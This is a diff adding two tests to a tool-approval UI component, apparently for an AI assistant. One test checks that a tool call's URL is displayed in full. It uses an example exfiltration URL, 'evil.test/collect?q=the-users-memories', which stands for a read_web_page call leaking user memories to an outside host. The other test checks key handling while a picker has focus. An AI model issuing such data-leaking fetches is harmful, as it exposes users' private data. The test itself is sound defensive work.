@@ -34,6 +34,24 @@ describe("ToolApprovalBar", () => {
     expect(await renderToHtml(<ToolApprovalBar approvals={[]} onRespond={() => {}} />)).toBe("");
   });
 
+  it("shows a call's URL in full without opening the arguments", async () => {
+    const target = "https://evil.test/collect?q=the-users-memories";
+    const html = await renderToHtml(
+      <ToolApprovalBar
+        approvals={[
+          approval({
+            toolId: "read_web_page",
+            name: "read_web_page",
+            server: "",
+            args: { url: target },
+          }),
+        ]}
+        onRespond={() => {}}
+      />,
+    );
+    expect(textOf(html)).toContain(target);
+  });
+
   it("shows why the assistant says it is making the call", async () => {
     const html = await renderToHtml(
       <ToolApprovalBar
@@ -166,6 +184,22 @@ describe("ToolApprovalBar", () => {
     document.body.appendChild(composer);
     composer.dispatchEvent(new KeyboardEvent("keydown", { key: "a", bubbles: true }));
     composer.remove();
+    expect(answered).toEqual([]);
+  });
+
+  it("ignores those keys while a picker has focus, since they choose an option there", async () => {
+    const answered: Array<[string, boolean]> = [];
+    const mounted = await mountForInteraction(
+      <ToolApprovalBar approvals={[approval()]} onRespond={(id, ok) => answered.push([id, ok])} />,
+    );
+    cleanup = mounted.unmount;
+    await new Promise((resolve) => setTimeout(resolve, 500));
+
+    const picker = document.createElement("select");
+    document.body.appendChild(picker);
+    picker.dispatchEvent(new KeyboardEvent("keydown", { key: "a", bubbles: true }));
+    picker.dispatchEvent(new KeyboardEvent("keydown", { key: "d", bubbles: true }));
+    picker.remove();
     expect(answered).toEqual([]);
   });
 
